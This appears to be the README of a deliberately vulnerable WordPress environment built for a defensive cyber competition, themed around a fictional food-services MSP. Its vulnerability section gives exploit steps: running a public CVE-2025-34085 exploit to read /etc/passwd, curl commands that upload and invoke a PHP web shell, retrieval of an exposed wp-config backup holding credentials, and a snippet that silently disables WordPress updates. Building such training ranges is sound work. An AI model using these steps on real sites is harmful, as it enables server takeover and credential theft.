# WordPress Competition Environment

## ChefOps - Ocean Crest Kitchens

ChefOps is a managed service provider specializing in the food services industry, responsible for keeping both its own internal systems and its clients’ environments secure, reliable, and operational. As a growing MSP, ChefOps supports restaurant groups that rely on a mix of modern platforms and aging legacy systems to run day-to-day operations. Its mission is to ensure that kitchens stay online, staff retain access to critical systems, and customer-facing services continue uninterrupted—all while defending against cyber threats that target availability, data integrity, and access control.

At the time of the scenario, ChefOps has recently onboarded Ocean Crest Kitchens, a regional restaurant chain undergoing a modernization effort. This places ChefOps in a high-pressure position where security decisions directly affect business continuity, revenue, and customer trust. Engineers must balance hardening systems with enabling employees to do their jobs, manage configuration and identity changes carefully, monitor for suspicious activity, and respond to incidents in a way that makes sense to both technical teams and business leadership. The theme emphasizes that in a real company like ChefOps, cybersecurity is not just about stopping attackers—it’s about protecting the operations that keep the business running.

## Competition Theme

This competition is themed around a realistic managed services and enterprise security engagement. Participants act as newly hired Security and Operations Engineers for **ChefOps**, a Managed Service Provider (MSP) that specializes in supporting businesses in the food services industry. ChefOps is responsible for maintaining secure, reliable, and compliant IT services for both its own internal operations and for external clients, with its newest and most important client being **Ocean Crest Kitchens**, a regional restaurant chain undergoing modernization of legacy systems while continuing daily business operations.

The environment is designed to feel realistic and imperfect, reflecting the tension between security, uptime, and business demands. Participants will navigate legacy systems alongside incremental upgrades, managing availability of critical business systems, monitoring and access management, and incident response—all while dealing with the constraints of staffing limits, legacy integrations, and competing priorities. The scenario emphasizes change and configuration management, cybersecurity as a business function, identity and access control, system networking and infrastructure, and monitoring and incident response.

The intended participant experience is that of defending a real organization with real employees who need access to do their jobs, real stakeholders demanding uptime, real modernization projects with messy edges, and real pressure to make safe, reversible decisions. This is an operations-and-defense scenario grounded in a food services business—not a puzzle, not a lab, and not a tutorial. The website structure separates public-facing content (Ocean Crest Kitchens) from internal/client portal content (ChefOps), with WordPress roles and permissions appropriately configured.

---

## Known Vulnerabilities

### 1. Vulnerable Plugins 

Several installed plugins have known vulnerabilities that can be exploited for RCE or privilege escalation. Use WPScan to identify and exploit these.

**Note:** The following code has been added the the `functions.php` file of the active ChefOps theme to disable the plugin update service, forcing blue teamers to Google each plugin and replace it manually. 

```php
// I got tired of all the annoying update nags so I disabled the checks. I'll comment out the three filters below when I need to update later... 
add_filter('pre_site_transient_update_plugins', function ($value) {
    // Return an object with empty updates
    return (object) ['last_checked' => time(), 'checked' => [], 'response' => []];
});
add_filter('pre_site_transient_update_themes', function ($value) {
    return (object) ['last_checked' => time(), 'checked' => [], 'response' => []];
});
add_filter('pre_site_transient_update_core', function ($value) {
    return (object) ['last_checked' => time(), 'version_checked' => '', 'updates' => []];
});
``` 

#### Simple File List Plugin RCE (CVE-2025-34085)

The Simple File List plugin version 4.2.2 and earlier contains an unauthenticated arbitrary file upload vulnerability. Attackers can upload malicious files through the plugin's file upload functionality without authentication, leading to remote code execution on the WordPress server.

**Exploit Steps:**

1. `git clone https://github.com/0xgh057r3c0n/CVE-2025-34085` 
2. `pip install colorama` 
3. `python CVE-2025-34085.py -u http://localhost:8080 --cmd "cat /etc/passwd"` 

#### WP File Manager

Authenticated low-priv user uploads PHP via plugin upload endpoint (example using cookie auth).
```bash
curl -b cookies.txt -F "uploadfile=@shell.php" \
  http://localhost:8080/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php
curl "http://localhost:8080/wp-content/plugins/wp-file-manager/lib/files/shell.php?cmd=id"
```

**Vulnerable plugin downloaded from:** https://github.com/eemitch/Simple-File-List/tree/895fce347c15463e85d96ceff9c71e05618b4f94

#### [WIP] Sneeit Framework == 8.3 (CVE-2025-6389 - Unauthenticated RCE). 

Plugin downloaded from: https://github.com/tiennguyenvan/sneeit-framework/tree/f461509a99e3663631ea722ec8fd456d718b694a


### 2. Wp-config.php Backup Exposure

The web server is misconfigured to serve a backup copy of the `wp-config.php` file named `wp-config.php.bak`. This file contains sensitive information such as database credentials and authentication keys. An attacker can download this backup file to gain access to the database and potentially compromise the entire WordPress installation.

**Exploit Steps:**

1. Download the backup file:
   ```bash
   curl http://localhost:8080/wp-config.php.bak -o wp-config.php.bak
   ```

2. Enjoy : ) 


### 3. Webdav Allows Web Shell File Upload

Upload and execute a new payload.

1. Upload web shell: `curl -T shell.php http://localhost:8080/wp-content/uploads/shell.php`
2. Execute command: `curl "http://localhost:8080/wp-content/uploads/shell.php?cmd=whoami"`


### 4. Directory Listing Enabled

Browse directories to discover components.

1. Plugins: `curl http://localhost:8080/wp-content/plugins/`
2. Themes: `curl http://localhost:8080/wp-content/themes/`
3. Uploads: `curl http://localhost:8080/wp-content/uploads/`
4. Core includes: `curl http://localhost:8080/wp-includes/`
5. Admin files: `curl http://localhost:8080/wp-admin/`
